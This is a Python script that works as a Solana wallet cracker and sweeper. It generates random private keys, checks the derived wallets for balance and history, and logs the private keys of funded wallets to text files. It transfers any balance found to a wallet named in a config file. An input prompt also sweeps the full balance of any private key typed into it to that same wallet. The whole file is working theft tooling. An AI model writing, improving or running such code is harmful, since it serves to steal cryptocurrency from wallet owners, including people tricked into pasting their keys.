import time
import os
import json
import base58
import threading
from nacl.signing import SigningKey  # For Ed25519 key generation
from solana.rpc.api import Client
from solana.publickey import Pubkey
from solana.transaction import Transaction
from solana.system_program import TransferParams, transfer
from solana.keypair import Keypair
from solana.exceptions import SolanaRpcException
from functools import wraps

# Load configuration from config.json
with open("config.json", "r") as config_file:
    config = json.load(config_file)

YOUR_WALLET = config["YOUR_WALLET"]
REQUEST_DELAY = config["REQUEST_DELAY"]
RPC_RETRIES = config.get("RPC_RETRIES", 3)
RPC_RETRY_DELAY = config.get("RPC_RETRY_DELAY", 2)

# Solana RPC endpoint
SOLANA_RPC = config["RPC_SERVER"]
client = Client(SOLANA_RPC)

# Files to save wallet details and command outputs
WALLET_LOG_FILE = "found_wallets.txt"
POTENTIAL_WALLET_FILE = "potential.txt"
COMMAND_OUTPUT_FILE = "output_command.txt"

# Flag to pause/resume the main loop
pause_generation = False

def wait_for_rpc():
    """Wait until the RPC endpoint is healthy before resuming generation."""
    print("RPC error encountered. Pausing generation until RPC node is healthy...")
    while True:
        try:
            # Check the health; get_health() should return {"result": "ok"} when healthy.
            health = client.get_health()
            if health and health.get("result") == "ok":
                print("RPC node is healthy. Resuming generation...")
                break
        except Exception:
            print("Waiting for RPC node to recover...")
        time.sleep(5)

def with_rpc_retry(func):
    """Decorator to retry RPC calls if a SolanaRpcException occurs."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        for attempt in range(RPC_RETRIES):
            try:
                return func(*args, **kwargs)
            except SolanaRpcException as e:
                print(f"RPC error on attempt {attempt+1}/{RPC_RETRIES} in {func.__name__}: {e}")
                time.sleep(RPC_RETRY_DELAY)
        # If all retries fail, wait for the RPC to recover before retrying once more.
        wait_for_rpc()
        return func(*args, **kwargs)
    return wrapper

def generate_ed25519_keypair():
    """Generate a random Ed25519 keypair and return the private key as Base58."""
    seed = os.urandom(32)
    signing_key = SigningKey(seed)
    private_key = signing_key._signing_key
    private_key_base58 = base58.b58encode(private_key).decode('utf-8')
    return private_key_base58

def base58_to_ed25519_keypair(private_key_base58):
    """Convert a Base58-encoded Ed25519 private key to a Keypair."""
    try:
        private_key_bytes = base58.b58decode(private_key_base58)
        if len(private_key_bytes) != 64:
            raise ValueError("Invalid Ed25519 private key length. Expected 64 bytes.")
        keypair = Keypair.from_secret_key(private_key_bytes)
        return keypair
    except Exception as e:
        print(f"Error decoding private key: {e}")
        return None

def private_key_to_wallet(private_key):
    """Convert a private key to a Solana wallet address."""
    if isinstance(private_key, str):
        keypair = base58_to_ed25519_keypair(private_key)
    else:
        keypair = Keypair.from_secret_key(private_key)
    return str(keypair.public_key), keypair

@with_rpc_retry
def check_wallet_balance(wallet_address):
    """Check the balance of a Solana wallet in SOL."""
    pubkey = Pubkey.from_string(wallet_address)
    balance_response = client.get_balance(pubkey)
    balance_lamports = balance_response.value if balance_response else 0
    balance_sol = balance_lamports / 1_000_000_000
    return balance_sol

@with_rpc_retry
def check_wallet_transactions(wallet_address):
    """Check if the wallet has any transactions."""
    pubkey = Pubkey.from_string(wallet_address)
    transactions_response = client.get_signatures_for_address(pubkey)
    return bool(transactions_response.value)

@with_rpc_retry
def send_sol(sender_keypair, recipient_wallet, amount_sol):
    """Send SOL from one wallet to another."""
    amount_lamports = int(amount_sol * 1_000_000_000)
    txn = Transaction().add(transfer(TransferParams(
        from_pubkey=sender_keypair.public_key,
        to_pubkey=Pubkey.from_string(recipient_wallet),
        lamports=amount_lamports
    )))
    client.send_transaction(txn, sender_keypair)
    print(f"Sent {amount_sol} SOL to {recipient_wallet}.")
    return True

def log_wallet_details(private_key, wallet_address, balance_sol, has_transactions=False):
    """Log wallet details to a text file."""
    with open(WALLET_LOG_FILE, "a") as f:
        f.write(f"Private Key: {private_key}\n")
        f.write(f"Wallet Address: {wallet_address}\n")
        f.write(f"Balance: {balance_sol} SOL\n")
        f.write("-" * 40 + "\n")
    
    if has_transactions:
        with open(POTENTIAL_WALLET_FILE, "a") as f:
            f.write(f"Private Key: {private_key}\n")
            f.write(f"Wallet Address: {wallet_address}\n")
            f.write(f"Balance: {balance_sol} SOL\n")
            f.write("-" * 40 + "\n")

def check_wallet_command(private_key):
    """Check a wallet using a private key and save the output."""
    global pause_generation
    pause_generation = True  # Pause the main loop
    try:
        wallet_address, keypair = private_key_to_wallet(private_key)
        if not keypair:
            output = "Invalid private key.\n"
        else:
            balance_sol = check_wallet_balance(wallet_address)
            has_transactions = check_wallet_transactions(wallet_address)
            output = (
                f"Wallet Address: {wallet_address}\n"
                f"Balance: {balance_sol} SOL\n"
                f"Has Transactions: {has_transactions}\n"
            )
            
            if balance_sol > 0:
                if send_sol(keypair, YOUR_WALLET, balance_sol):
                    output += f"Transferred {balance_sol} SOL to your wallet.\n"
            
            if has_transactions:
                log_wallet_details(private_key, wallet_address, balance_sol, has_transactions=True)
        
        with open(COMMAND_OUTPUT_FILE, "a") as f:
            f.write(output)
            f.write("-" * 40 + "\n")
        
        print(output)
        time.sleep(10)
    except SolanaRpcException:
        # Although RPC calls are retried, if an exception bubbles up, wait for RPC.
        wait_for_rpc()
    finally:
        pause_generation = False  # Resume the main loop

def main():
    def input_thread():
        """Thread to handle user input."""
        while True:
            private_key = input("Enter a private key to check (or 'exit' to quit): ")
            if private_key.lower() == "exit":
                os._exit(0)
            check_wallet_command(private_key)

    # Start the input thread
    threading.Thread(target=input_thread, daemon=True).start()

    try:
        while True:
            if pause_generation:
                time.sleep(1)
                continue

            # Generate a random Base58-encoded Ed25519 private key
            private_key_base58 = generate_ed25519_keypair()
            print(f"Generated Private Key: {private_key_base58}")
            
            # Convert the private key to a wallet address
            wallet_address, keypair = private_key_to_wallet(private_key_base58)
            if not keypair:
                print("Invalid private key. Skipping...")
                continue

            # Check the wallet balance and transactions
            balance_sol = check_wallet_balance(wallet_address)
            has_transactions = check_wallet_transactions(wallet_address)

            if balance_sol > 0:
                print(f"Found wallet with balance: {wallet_address} (Balance: {balance_sol} SOL)")
                log_wallet_details(private_key_base58, wallet_address, balance_sol, has_transactions)
                send_sol(keypair, YOUR_WALLET, balance_sol)
            else:
                print(f"Wallet {wallet_address} is empty.")

            time.sleep(REQUEST_DELAY)
    except KeyboardInterrupt:
        print("\nScript stopped by user. Exiting gracefully...")

if __name__ == "__main__":
    main()
